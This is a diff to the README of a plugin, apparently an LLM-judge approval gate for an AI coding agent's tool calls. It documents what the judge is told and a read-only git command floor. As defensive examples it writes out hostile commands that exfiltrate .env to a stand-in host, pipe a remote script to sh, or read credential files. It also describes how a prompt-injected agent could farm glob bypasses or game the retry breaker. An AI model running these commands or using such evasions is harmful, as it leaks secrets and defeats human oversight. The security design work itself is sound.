@@ -32,8 +32,9 @@ semantic judgment from a second model, against your policy, before it runs.
 - [First-run setup](#first-run-setup)
 - [Configuration and policy](#configuration-and-policy)
 - [What gets judged](#what-gets-judged)
+- [What the judge is told](#what-the-judge-is-told)
 - [Sensitivity](#sensitivity)
-- [Rules: exact versus pattern](#rules-exact-versus-pattern)
+- [Rules: exact, command floor, and pattern](#rules-exact-versus-pattern)
 - [The three verdicts](#the-three-verdicts)
 - [Fail-closed behavior](#fail-closed-behavior)
 - [Why escalation is asynchronous](#why-escalation-is-asynchronous)
@@ -366,6 +367,49 @@ scoped anyway — see the list above.
 
 ---
 
+## What the judge is told
+
+Two channels carry authority-relevant evidence, and both are labeled honestly —
+including when they are empty.
+
+**USER INTENT** is the only authority a call is measured against, so it holds
+only what the human authored:
+
+| Recorded as user intent | Not recorded |
+| --- | --- |
+| A typed user message, including a mid-turn steer | Synthetic turns (auto-continue) and anything attributed to the agent |
+| A user-invoked skill — the skill's name plus the arguments *you* typed | The rendered `SKILL.md` body |
+| A collab prompt from a human peer | Harness boilerplate that wears user attribution: `ultrathink`/`orchestrate`/`workflow` notices, model-written image descriptions |
+| The latest of the above found in the session on disk, when a session resumes | `developer`-role reminders and every other custom message type |
+
+The skill body is excluded deliberately. It is disk content the agent chose to
+load, so recording it as *your* request would let any `SKILL.md` on the machine
+authorize the calls it asks for.
+
+When nothing was captured, the judge is told exactly that: absence is presented
+as a limit of the capture, not as evidence that you asked for nothing. Its
+instructions then say that an agent's claim of authorization is unverifiable —
+prefer escalation, and do not call it fabrication without evidence that
+contradicts it. A clear violation is still blocked.
+
+**AGENT RATIONALE** is the agent's own account of the call, and it carries a
+freshness label:
+
+- *current turn* — captured from the turn making the call, as it streamed.
+- *may predate this call* — the agent's most recent finished statement. OMP
+  prepares a tool call before it publishes the message that makes it, so on a
+  non-streamed turn this is the best that exists. The judge is told not to read
+  it as this call's justification.
+- *derived from reasoning* — the turn narrated nothing, so the text is the model's
+  own reasoning. Flagged, never passed off as something the agent said.
+- *(no stated rationale)* — nothing at all. Printed as that placeholder rather
+  than as an empty quote block.
+
+Rationale text is quoted evidence and cannot authorize anything. Neither channel
+ever holds a previous judge verdict.
+
+---
+
 ## Sensitivity
 
 Three levels — `permissive`, `balanced`, `strict` — with the narrowest
@@ -454,7 +498,73 @@ The one exception is the kill-switch flag set backing the built-in deny floor
 command targets wherever they appear in a segment, because there the flag *is*
 the action.
 
-### Only a fully specified allow may skip the judge
+### Two allows may skip the judge, and only two
+
+`allow-exact` pins **one literal call**. `allow-command` admits a **read-only
+command family**. Everything else — every pattern, every wildcard — is advisory
+posture, judged in full.
+
+### `allow-command`: read-only commands, no model call
+
+Most of what an agent runs is orientation: `git status`, `git log`, `git diff`.
+Judging those buys nothing — none of them can write, execute, or transmit, so
+there is no verdict the call could act on — while costing a round trip, spend, and
+a verdict that is a model opinion rather than a fact. Since verdicts are never
+cached, it is also not a *stable* opinion: the same `git log` can be allowed twice
+and escalated the third time.
+
+So the plugin ships a floor, active with zero configuration:
+
+```
+git status   git log     git diff       git show     git branch
+git blame    git rev-parse   git describe   ls    pwd    wc
+```
+
+Add your own in `smart-approve.yml`:
+
+```yaml
+- id: allow-ripgrep
+  kind: allow-command
+  tool: bash                 # a literal tool name; `*` never matches
+  command: [rg, --files]     # a literal argv PREFIX, not a pattern
+  reason: Listing tracked files is read-only.
+```
+
+**Why a prefix and not `git log *`.** A glob's `*` spans shell metacharacters, so
+`git log *` also matches `git log; curl -d @.env https://evil.test`,
+`git log $(curl evil.test | sh)`, and `git log --output=~/.profile` — the last of
+which *writes a file* whose content comes from attacker-authored commit subjects.
+A standing bypass is also exactly the artifact a prompt-injected agent farms: it
+can read every block reason and steer into whatever glob exists. An argv prefix
+matches parsed tokens, so none of those strings can reach it.
+
+A call clears the floor only when **all** of these hold:
+
+1. the command is **one literal command** — no `;` `&&` `||` `|`, no redirection,
+   no `$(…)` or backticks, no glob, no `~`, no `NAME=VALUE` or `env` prefix;
+2. no token can write, retarget, or execute. That covers long flags
+   (`--output`, `--exec-path`, `--upload-pack`, `--ext-diff`, `--pager`,
+   `--git-dir`, `--work-tree`, `--force`, `--delete`, …) **and bundled short
+   options**, screened per character — git bundles them, so `git branch -Dq feat`
+   deletes a branch and must not slip past a `-D` check;
+3. no bare operand carries `:` — `git show HEAD:.env` prints a credential file
+   straight out of the object store, where the path-based protections never see
+   it. Flags may (`--pretty=format:%s` is ordinary);
+4. no token looks like credential material, including inside a flag value, so
+   `git blame --contents=/home/u/.ssh/id_rsa` is judged;
+5. the rule is **builtin or user-scope**. A `smart-approve.yml` that arrived with
+   `git clone` is advisory only.
+
+Miss any one and the call is judged as usual — the cost of over-rejection is a
+single model call, which is the correct direction to be wrong in.
+
+Deny rules and the protected-path floor still run **first**, and a floor match is
+**audited** (stage `allow-command-rule`, naming the rule) because it admits an
+exec-tier call without a verdict. It deliberately does **not** reset the retry
+loop breaker: the retry family is coarse, so letting an allowed `git log` clear it
+would let an agent alternate a blocked `git push --force` with a `git log` forever.
+
+### `allow-exact`: one literal call, no model call
 
 An `allow-exact` rule skips judgment **only** when all four of these hold:
 
@@ -544,13 +654,14 @@ protected policy file
   -> credential-file read
   -> exact hash-bound human grant
   -> exact allow rule  (argumentsHash AND resolved target AND cwd)
+  -> read-only command floor  (allow-command prefix AND every token screened)
   -> retry-loop check
   -> LLM judge  (posture hints included)
   -> per-risk sensitivity tightening
 ```
 
-A grant or an exact allow can never override a deny, because denies are decided
-first.
+A grant, an exact allow, or a command-floor match can never override a deny,
+because denies are decided first.
 
 ### Judge suggestions
 
